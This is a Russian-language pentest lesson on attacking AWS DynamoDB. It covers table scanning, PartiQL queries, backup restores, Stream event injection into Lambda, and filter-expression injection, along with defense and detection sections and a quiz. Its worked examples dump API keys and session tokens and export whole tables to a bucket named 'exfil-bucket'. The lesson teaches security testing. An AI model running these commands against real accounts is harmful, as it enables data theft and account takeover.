---
id: cloud-dynamodb
title: "DynamoDB: сканирование, бэкапы, streams и инъекции в ключи"
category: cloud
parent: cloud-aws-data-deep
difficulty: medium
order: 1
tags: [cloud, aws, dynamodb, nosql, backup, streams, injection]
prerequisites: [cloud-aws-data-deep, cloud-storage-s3]
useful_for:
  - "Пентест NoSQL-хранилищ AWS"
  - "Извлечение данных через scan/export"
  - "Анализ потоков DynamoDB Streams"
estimated_minutes: 45
summary: "DynamoDB: чтение таблиц через Scan/PartiQL, экспорт в S3, восстановление из бэкапов, DynamoDB Streams и инъекции в ключи/выражения."
---

## Зачем этот урок

DynamoDB — управляемая NoSQL-база AWS, которую используют для сессий, токенов, конфигураций и пользовательских данных. В отличие от RDS, здесь нет сетевого порта: доступ полностью через IAM. Это делает ошибки в политиках особенно опасными — одна неверная `Resource: "*"` открывает все таблицы аккаунта. Атакующего интересуют: массовое чтение (`Scan`), экспорт в S3, бэкапы, потоки изменений и инъекции в фильтры/ключи, если приложение строит запросы небезопасно.

## Модель сервиса

Таблица состоит из элементов (items) с атрибутами. Первичный ключ — partition key (+ опционально sort key). Чтение возможно двумя способами: `Query` (по ключу, эффективно) и `Scan` (по всей таблице, дорого). Дополнительные сущности:

- **GSI/LSI** — вторичные индексы, читаются отдельно.
- **Backup** — on-demand или point-in-time recovery (PITR).
- **Export** — выгрузка в S3 без влияния на производительность.
- **Streams** — поток изменений (CDC), часто питает Lambda.
- **DAX** — кэш.

## Инструменты и команды

```bash
# Инвентаризация таблиц и их размера
aws dynamodb list-tables
aws dynamodb describe-table --table-name Sessions \
  --query 'Table.{Size:TableSizeBytes,Items:ItemCount,Stream:StreamSpecification,Enc:SSEDescription.Status}' --output json

# Чтение по ключу
aws dynamodb get-item --table-name Sessions \
  --key '{"session_id":{"S":"abc123"}}'

# Массовое чтение (осторожно: дорого и шумно)
aws dynamodb scan --table-name Users --max-items 1000 > users.json
aws dynamodb scan --table-name Users --projection-expression "email,role" --page-size 100

# PartiQL (SQL-подобный язык)
aws dynamodb execute-statement --statement "SELECT * FROM Users WHERE role='admin'"

# Экспорт в S3 (не влияет на прод)
aws dynamodb export-table-to-point-in-time \
  --table-arn arn:aws:dynamodb:us-east-1:111122223333:table/Users \
  --s3-bucket exfil-bucket --s3-prefix users/ --export-format DYNAMODB_JSON

# Бэкапы
aws dynamodb list-backups
aws dynamodb restore-table-from-backup --target-table-name UsersRestored \
  --backup-arn arn:aws:dynamodb:us-east-1:111122223333:table/Users/backup/01234567890123-abcdefgh

# Потоки
aws dynamodbstreams list-streams
aws dynamodbstreams describe-stream --stream-arn arn:aws:dynamodb:us-east-1:111122223333:table/Users/stream/2024-01-01T00:00:00.000
```

## Разобранный пример: scan → экспорт → анализ

Сценарий: у роли есть `dynamodb:Scan` на `Resource: "*"`.

```bash
aws dynamodb list-tables
# {"TableNames": ["Sessions", "Users", "ApiKeys"]}

aws dynamodb scan --table-name ApiKeys --output json > /tmp/apikeys.json
python3 - <<'PY'
import json
d = json.load(open('/tmp/apikeys.json'))
for it in d['Items']:
    print(it.get('key',{}).get('S'), '|', it.get('owner',{}).get('S'), '|', it.get('created',{}).get('S'))
PY
# sk_live_51H...  | acct-prod | 2024-03-01
# sk_test_9x...   | acct-dev  | 2024-02-10
```

Из `ApiKeys` достаём ключи платёжного провайдера, из `Sessions` — токены активных сессий (потенциальный захват аккаунтов), из `Users` — email/роли.

## Чек-лист атаки

1. `list-tables` → `describe-table` (размер, потоки, шифрование).
2. `scan`/`execute-statement` по чувствительным таблицам (сессии, ключи, пользователи).
3. `export-table-to-point-in-time` — тихая выгрузка в S3, которую сложнее заметить в прод-метриках.
4. `list-backups` + `restore-table-from-backup` — восстановление копии в свою таблицу.
5. `dynamodbstreams` — если поток питает Lambda, инъекция в него = выполнение кода.
6. Проверить GSI: иногда права есть только на индекс, но он покрывает нужные атрибуты.

## Обход защит и edge cases

- **Fine-grained access control (LeadingKeys).** Если условие ограничивает `dynamodb:LeadingKeys`, `scan` может вернуть только свои элементы. Обход: искать GSI без условия, или таблицу, где условие отсутствует.
- **VPC endpoint.** Если доступ только через endpoint, из интернета не подключиться — нужен пивот внутри VPC.
- **Шифрование.** `SSESpecification` по умолчанию использует AWS-owned key; чтение всё равно работает по IAM. CMK требует `kms:Decrypt`.
- **PITR.** Включённый PITR позволяет восстановить состояние на любую точку за 35 дней — иногда это способ вернуть удалённые элементы.
- **Инъекции.** Если приложение формирует `KeyConditionExpression` конкатенацией, возможна инъекция в sort key (например, `begins_with`). Тестируйте на «доверенных» полях.

## Частые ошибки и подводные камни

- `Scan` без `--max-items` на большой таблице — дорого по RCU и легко заметить по метрикам.
- Считать, что DynamoDB «нельзя дампить»: `export-table-to-point-in-time` работает даже без Scan-прав.
- Забыть про регион и роль: таблица в другом регионе не видна из текущей конфигурации.
- Путать `Query` и `Scan`: первый требует ключ, второй читает всё.
- Игнорировать Streams как канал RCE: поток часто подписан на Lambda с широкой ролью.

## Защита и детект

- Принцип наименьших привилегий: ограничивать `dynamodb:*` конкретными ARN таблиц и использовать `LeadingKeys`.
- Включить PITR и шифрование CMK; ограничить `dynamodb:ExportTableToPointInTime` и `RestoreTableFromBackup`.
- GuardDuty и CloudTrail пишут `Scan`/`ExportTableToPointInTime`; алертить на аномальные объёмы чтения.
- Не хранить долгоживущие API-ключи в открытом виде — использовать KMS и ротацию.

## Что дальше / решение

Из DynamoDB обычно достаются сессионные токены и API-ключи. Дальше — использовать их против приложений (захват аккаунтов, доступ к внешним API). Если `Scan` ограничен, пробуйте `export`/`restore`/`streams`. Зафиксируйте результат в графе как источник кредов и переходите к следующему сервису. Для зашифрованных таблиц с недоступным CMK — `blocked` с условием `kms:Decrypt`.

## Разобранный пример 2: PartiQL и фильтры

PartiQL позволяет писать SQL-подобные запросы к DynamoDB. Важно: за кулисами он всё равно использует Scan/Query, поэтому права и стоимость те же.

```bash
# Все админы
aws dynamodb execute-statement \
  --statement "SELECT user_id, email FROM Users WHERE role = 'admin'"

# Фильтр по атрибуту (за кулисами — Scan)
aws dynamodb scan --table-name Orders \
  --filter-expression "amount > :a" \
  --expression-attribute-values '{":a":{"N":"10000"}}' \
  --max-items 500

# Проекция только нужных полей, чтобы уменьшить объём
aws dynamodb scan --table-name Users --projection-expression "email, mfa_enabled"
```

Если приложение собирает `FilterExpression` конкатенацией пользовательского ввода, возможна инъекция: например, злоумышленник добавляет условие, расширяющее выборку (`OR attribute_exists(x)`), или подменяет значение sort key в `begins_with`. Проверяйте поля, которые попадают в `KeyConditionExpression`, `FilterExpression` и в PartiQL-строки.

## GSI, DAX и тонкости прав

- **GSI (Global Secondary Index).** Права выдаются на ARN индекса (`table/Users/index/email-index`). Частая ошибка админов — политика покрывает индекс, но не таблицу, и наоборот. Проверяйте `describe-table` на наличие `GlobalSecondaryIndexes` и тестируйте доступ к индексу отдельно.
- **LSI (Local Secondary Index).** Создаётся только при создании таблицы; имеет отдельный ARN.
- **DAX.** Кэш перед таблицей. Если приложение ходит только через DAX, метрики чтения таблицы «чистые», но кэш может отдавать чужие данные. DAX не имеет отдельной IAM-модели поверх DynamoDB.
- **Транзакции.** `TransactGetItems`/`TransactWriteItems` требуют отдельных прав; иногда политика разрешает только транзакционный доступ — используйте его для чтения.

## Практическое задание

1. Создайте таблицу с partition key и sort key, добавьте GSI.
2. Выдайте роль, у которой `dynamodb:Scan` разрешён только на GSI, и убедитесь, что чтение таблицы напрямую падает с `AccessDeniedException`, а через индекс — работает.
3. Включите PITR, удалите элементы, восстановите таблицу на точку до удаления.
4. Настройте DynamoDB Streams и подпишите Lambda; посмотрите, какие поля события содержат исходные данные.

## Таблица «сценарий → API → результат»

| Сценарий | API-вызов | Что получаем |
|---|---|---|
| Массовое чтение | `Scan` / `execute-statement` | Данные таблицы |
| Тихая выгрузка | `ExportTableToPointInTime` | Данные в S3 (Parquet/JSON) |
| Восстановление удалённого | `RestoreTableFromBackup` / PITR | Копия состояния на момент времени |
| Чтение индекса | `Query` по GSI ARN | Данные из индекса |
| Инъекция события | `PutItem` в таблицу с потоком | Триггер Lambda |
| Доступ по ключу | `GetItem` с `LeadingKeys` | Только свои элементы |

## Модель угроз и типовые мисконфиги

DynamoDB почти не имеет «сетевой» защиты — единственный барьер это IAM. Поэтому модель угроз сводится к ошибкам в политиках и к приложению, которое ходит в базу. Разберём типовые мисконфиги, которые встречаются на пентестах.

Во-первых, `Resource: "*"` в политике приложения. Разработчик даёт сервисной роли `dynamodb:*` на все таблицы «чтобы не мешало». В результате компрометация одной роли (например, через SSRF или RCE в Lambda) открывает все таблицы аккаунта: сессии, платежи, ключи. Проверяется просто: `aws iam simulate-principal-policy` с действием `dynamodb:Scan` и ARN чужой таблицы.

Во-вторых, отсутствие `LeadingKeys`. Политика разрешает `Scan`, но не ограничивает доступ по значению partition key. Многопользовательские приложения обязаны добавлять условие `dynamodb:LeadingKeys = ${aws:PrincipalTag/userid}`. Без него любой пользователь с этой ролью читает чужие элементы — классический горизонтальный выход за пределы арендатора.

В-третьих, включённый экспорт и PITR. Админы включают `ExportTableToPointInTime` «для аналитики», не ограничивая его по IAM. Атакующий без `Scan` может выгрузить всю таблицу в S3 и прочитать оттуда. Аналогично `RestoreTableFromBackup` создаёт копию таблицы, включая элементы, которые приложение «удалило».

В-четвёртых, Streams, подписанные на Lambda. Поток изменений — это CDC-канал, и Lambda-подписчик почти всегда имеет широкую роль (пишет в другие таблицы, шлёт уведомления, читает секреты). Если у атакующего есть `dynamodb:PutItem` в таблицу с потоком, он может инъецировать событие и запустить обработчик с произвольными полями — потенциальный путь к RCE в Lambda или к подмене логики.

В-пятых, кросс-аккаунтный доступ. Таблица может быть расшарена через `Resource: "arn:aws:dynamodb:...:table/Users"` с `Principal: "*"` и слабым условием. Проверяйте `resource-based policies` (`get-resource-policy`) и условия `aws:SourceArn`/`aws:PrincipalOrgID`.

В-шестых, инъекции в приложении. Если бэкенд строит запросы к DynamoDB конкатенацией, возможны манипуляции с ключами и фильтрами. Тестируйте «доверенные» параметры: смена sort key, `begins_with`, условия в PartiQL.

Наконец, утечка через клиентов. Мобильные и SPA-приложения иногда получают временные креды с прямым доступом к таблице (Cognito identity pool с ролью `dynamodb:*`). Это позволяет клиенту читать всю таблицу без сервера — ищите такие identity pools в мобильных сборках.

## Разобранный пример 3: экспорт в S3 и анализ через Athena

Сценарий: `Scan` запрещён (условие `LeadingKeys`), но разрешён экспорт. Это типичная «аналитическая» конфигурация.

```bash
# Запускаем экспорт на текущий момент
aws dynamodb export-table-to-point-in-time \
  --table-arn arn:aws:dynamodb:us-east-1:111122223333:table/Users \
  --s3-bucket exfil-bucket --s3-prefix users/ --export-format ION \
  --s3-sse-algorithm AES256
# {"ExportDescription": {"ExportArn": "arn:aws:dynamodb:...:export/01234", "ExportStatus": "IN_PROGRESS"}}

# Ждём завершения
aws dynamodb describe-export --export-arn arn:aws:dynamodb:us-east-1:111122223333:table/Users/export/01234 \
  --query 'ExportDescription.ExportStatus'
# "COMPLETED"

# Данные лежат в S3 как ION/JSON-файлы — читаем напрямую
aws s3 ls s3://exfil-bucket/users/ --recursive | head
aws s3 cp s3://exfil-bucket/users/ABC/data/xyz.ion /tmp/ -r

# Или через Athena: создаём таблицу поверх экспорта
aws athena start-query-execution \
  --query-string "SELECT * FROM dynamodb_export.Users WHERE role='admin'" \
  --result-configuration OutputLocation=s3://exfil-bucket/results/
```

Важный момент: экспорт не влияет на производительность таблицы и почти не создаёт read-метрик, поэтому его сложнее заметить в мониторинге, чем `Scan`. Если у вашей роли нет `dynamodb:ExportTableToPointInTime`, проверьте `s3:GetObject` на бакет с экспортами — возможно, кто-то уже выгрузил данные. Часто бакет экспорта открыт шире, чем сама таблица.

## Квиз

```quiz
- question: "Почему DynamoDB опасна при ошибке в IAM-политике?"
  options:
    - "Нет сетевого порта — доступ полностью определяется IAM, и Resource:* открывает всё"
    - "Она публична по умолчанию"
    - "У неё нет шифрования"
    - "Она не логируется"
  answer: 0
  explanation: "DynamoDB не имеет сетевого периметра; всё решает IAM-политика."
- question: "Какой вызов позволяет выгрузить таблицу в S3 без Scan?"
  options:
    - "export-table-to-point-in-time"
    - "get-item"
    - "describe-table"
    - "list-backups"
  answer: 0
  explanation: "Экспорт на точку во времени выгружает данные в S3 напрямую."
- question: "Чем ценны DynamoDB Streams для атакующего?"
  options:
    - "Поток часто подписан на Lambda с привилегированной ролью"
    - "Он хранит пароли"
    - "Он меняет IAM"
    - "Он публичен"
  answer: 0
  explanation: "Инъекция события в поток может запустить Lambda и выполнить код от её роли."
- question: "Что делает LeadingKeys в политике?"
  options:
    - "Ограничивает доступ элементами с определённым значением partition key"
    - "Шифрует таблицу"
    - "Ускоряет Scan"
    - "Удаляет таблицу"
  answer: 0
  explanation: "dynamodb:LeadingKeys ограничивает доступ по значению ключа раздела."
```

## Где пригодится

- **Пентест AWS:** чтение NoSQL-хранилищ и сессий.
- **Bug bounty:** облачные приложения с открытыми таблицами.
- **Red team:** тихая выгрузка через export.
- **Сертификация:** AWS Security — Specialty.
